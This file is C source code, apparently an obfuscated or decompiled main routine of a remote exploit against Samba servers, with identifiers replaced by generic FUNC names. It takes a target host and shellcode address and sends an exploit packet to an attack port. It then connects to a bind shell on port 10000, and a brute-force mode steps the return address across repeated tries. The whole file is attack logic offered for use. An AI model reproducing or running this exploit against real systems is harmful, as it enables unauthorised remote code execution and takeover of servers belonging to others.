#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int u_long ;
typedef  int /*<<< orphan*/  tg_host ;
struct TYPE_2__ {int shell; char* ost; } ;

/* Variables and functions */
 int ATK_PORT ; 
 int BRUTE_AT ; 
 int SH_PORT ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 int FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC7 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,int /*<<< orphan*/ ,int) ; 
 TYPE_1__* plat ; 
 scalar_t__ FUNC9 (int,int) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 scalar_t__ FUNC11 (char*,int) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,int) ; 
 int FUNC14 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 

int FUNC16(int argc,char *argv[])
{
	int sock,whtl,type=0,brute_f=0;
	char tg_host[0x82]="localhost";
	u_long shell=plat[type].shell;
	
	(void)FUNC2();
	if(argc<2)
	{
		(void)FUNC15(argv[0]);
	}
	
	while((whtl=FUNC7(argc,argv,"H:h:S:s:T:t:IiB:b"))!=-1)
	{
		extern char *optarg;
		switch(whtl)
		{
			case 'H':
			case 'h':
				FUNC8((char *)tg_host,0,sizeof(tg_host));
				FUNC13(tg_host,optarg,sizeof(tg_host)-1);
				break;
				
			case 'S':
			case 's':
				shell=FUNC14(optarg,0,0);
				break;
				
			case 'T':
			case 't':
				if((type=FUNC1(optarg))>1)
				{
					(void)FUNC15(argv[0]);
				}
				else shell=plat[type].shell;
				break;
				
			case 'I':
			case 'i':
				(void)FUNC15(argv[0]);
				break;
				
			case 'B':
			case 'b':
				brute_f++;
				break;
				
			case '?':
				FUNC6(stderr," Try `%s -i' for more information.\n\n",argv[0]);
				FUNC4(-1);
				break;
		}
	}
	if(brute_f)
	{
		FUNC6(stdout," **\n ** OK, It's good selection, Attack tries %d times.\n",BRUTE_AT);
		FUNC6(stdout," ** If work process is boring, drink coffee and wait. hehe ;-D\n **\n\n");
		FUNC6(stdout," [*] Brute-Force mode:\n\n");
		FUNC6(stdout," |----+----+----+----+----+----+----+----+----+----+----+----+----|");
		FUNC6(stdout,"\n |");

		for(brute_f=0;brute_f<BRUTE_AT;brute_f++)
		{
			FUNC5(stdout);
			FUNC6(stdout,"=");

			shell+=(0x100);
			sock=(int)FUNC11(tg_host,ATK_PORT);
			
			if((int)FUNC9(sock,0)==-1)
			{
				while(!(brute_f>=BRUTE_AT-1))
				{
					FUNC6(stdout,"=");
					brute_f++;
				}
				FUNC6(stdout,"|\n\n");
				FUNC6(stderr," [-] Connect Failed.\n\n");
				FUNC4(-1);
			}
			
			FUNC0(sock,shell);
			FUNC3(sock);
			FUNC12(2);
			sock=(int)FUNC11(tg_host,SH_PORT);
			
			if((int)FUNC9(sock,0)==-1)
			{
				continue;
			}
			
			while(!(brute_f>=BRUTE_AT-1))
			{
				FUNC6(stdout,"=");
				brute_f++;
			}
			
			FUNC6(stdout,"|\n\n");
			FUNC6(stdout," [+] Shellcode address: %d\n",shell);
			FUNC6(stdout," [*] Brute-Force end !!\n\n");
			FUNC6(stdout," **\n ** Bind shellcode is port 10000.\n");
			FUNC6(stdout," ** If bindshell port number was changed, change connection port.\n **\n\n");
			
			(void)FUNC10(sock);
		}

		FUNC6(stdout,"|\n\n **\n");
		FUNC6(stdout," ** Brute-Force exploit failed. Reason is simple.\n **\n");
		FUNC6(stdout," ** Could not search shellcode's position during %d times.\n",BRUTE_AT);
		FUNC6(stdout," ** Or, Operating System's target that we attack isn't.\n");
		FUNC6(stdout," ** OOops ! is server Samba version doubtful ??\n **\n\n");
		FUNC4(-1);
	}
	else
	{
		FUNC6(stdout," [0] Target: %s\n",plat[type].ost);
		FUNC6(stdout," [1] Set socket.\n");
		sock=(int)FUNC11(tg_host,ATK_PORT);
		(int)FUNC9(sock,1);
		
		FUNC6(stdout," [2] Make shellcode & Send Packet.\n");
		FUNC0(sock,shell);
		FUNC3(sock);
		
		FUNC6(stdout," [3] Trying %s:%d.\n",tg_host,SH_PORT);
		FUNC12(2);
		
		sock=(int)FUNC11(tg_host,SH_PORT);
		(int)FUNC9(sock,1);
		
		FUNC6(stdout," [*] Connected to %s:%d.\n",tg_host,SH_PORT);
		(void)FUNC10(sock);
	}
}